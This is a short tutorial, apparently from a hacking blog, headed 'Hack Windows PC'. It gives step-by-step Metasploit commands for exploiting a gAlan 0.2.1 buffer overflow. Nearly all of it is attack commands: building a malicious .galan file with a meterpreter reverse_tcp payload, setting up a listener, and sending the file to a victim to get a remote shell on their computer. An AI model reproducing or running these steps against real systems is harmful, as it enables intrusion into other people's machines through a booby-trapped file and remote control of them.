Hack Windows PC using gAlan 0.2.1 Buffer Overflow

This module exploits a stack buffer overflow in gAlan 0.2.1 by creating a specially crafted galan file.
Glan 0.2.1
Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type 
msf > use exploit/windows/fileformat/galan_fileformat_bof
msf exploit (galan_fileformat_bof)>set payload windows/meterpreter/reverse_tcp
msf exploit (galan_fileformat_bof)>set lhost 192.168.1.2 (IP of Local Host)
msf exploit (galan_fileformat_bof)>exploit

After we successfully generate the malicious galan File, it will stored on your local computer
/root/.msf4/local/msf.galan

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.2
exploit 
Now send your msf.galan files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
